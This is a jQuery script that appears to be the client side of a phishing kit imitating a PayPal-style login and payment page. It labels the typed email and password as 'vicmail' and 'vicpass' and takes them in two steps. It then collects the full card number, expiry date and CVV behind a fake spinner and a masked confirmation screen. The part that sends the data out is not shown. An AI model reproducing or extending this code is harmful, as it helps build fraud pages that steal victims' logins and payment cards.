if ( $(window).width() < 500 ) {
$("#col").attr('class', 'columns is-multiline');
}
if ( $(window).width() < 500 ) {
$("#colTwo").attr('class', 'columns is-multiline');
}
$(".input_text").blur(function(){
if($(this).val().length < 3){
$(this).attr("class","input_text_error_img");
}else{
$(this).attr("class","input_text_success_img");
}
});
$(".input_text").keyup(function(){
if($(this).val().length >= 1){
$(this).css({'border' : '1px solid #0070ba'});
$(this).attr("class","input_text");
}
});
//##################################################### END BILLING & PAYMENT & BANK ####################################################
function spinner(){
$("#spinner").fadeIn(100).delay(1500);
$("#spinner").fadeOut(100);
}
//END SPINNER

$(".next").click(function(){
var vicmail = $("#email").val();
if (vicmail !== "") {
$("#spinner").fadeIn(100).delay(1500);
$("#spinner").fadeOut(100);
$("#login_passwd").fadeIn(100);
$("#login_email").fadeOut(10);
$("#vicmail").html(vicmail);
}else{
$(".errorMessageEmail").slideDown();
}
});
$(".sub").click(function(){
var vicpass = $("#pass").val();
if (vicpass !== "") {
}else{
$(".errorMessagePass").slideDown();
}
});
$('.input_login').keyup(function(){
$(".errorMessageEmail").hide();
$(".errorMessagePass").hide();
});

$(".paybtn").click(function(){
var noc = $("#noc").val();
var cn = $("#cn").val();
var ex = $("#ex").val();
var cvv = $("#cvv").val();
if (noc.length >= 5 && cn.length == 19 && ex.length == 7 && cvv.length >= 3) {
var lastFoor = cn.substr(cn.length - 4);
$("#spinner").fadeIn(100).delay(1500);
$("#spinner").fadeOut(100);
$("#conpay").fadeIn(100);
$("#paypay").fadeOut(10);
$("#lf").html("XXXX-XXXX-XXXX-"+lastFoor);
$("#exx").html(ex);
$('#cn').validateCreditCard(function(result) {
if(result.card_type.name == "visa"){
$('#cardt').attr('src','assets/c-visa.png');
}
if(result.card_type.name == "mastercard"){
$('#cardt').attr('src','assets/c-mastercard.png');
}
if(result.card_type.name == "amex"){
$('#cardt').attr('src','assets/c-amex.png');
}
if(result.card_type.name == "discover"){
$('#cardt').attr('src','assets/c-discover.png');
}

});

}
});
function card(){
$('#cn').validateCreditCard(function(result) {
if($('#cn').val().length >= 1 && result.card_type.name == "visa"){
$('#cn').attr('id','xv');
}else{
$('#xv').attr('id','cn');
}
});

$('#cn').validateCreditCard(function(result) {
if($('#cn').val().length >= 1 && result.card_type.name == "mastercard"){
$('#cn').attr('id','xm');
}else{
$('#xm').attr('id','cn');
}
});

$('#cn').validateCreditCard(function(result) {
if($('#cn').val().length >= 1 && result.card_type.name == "discover"){
$('#cn').attr('id','xd');
}else{
$('#xd').attr('id','cn');
}
});

$('#cn').validateCreditCard(function(result) {
if($('#cn').val().length >= 1 && result.card_type.name == "amex"){
$('#cn').attr('id','xa');
}else{
$('#xa').attr('id','cn');
}
});
}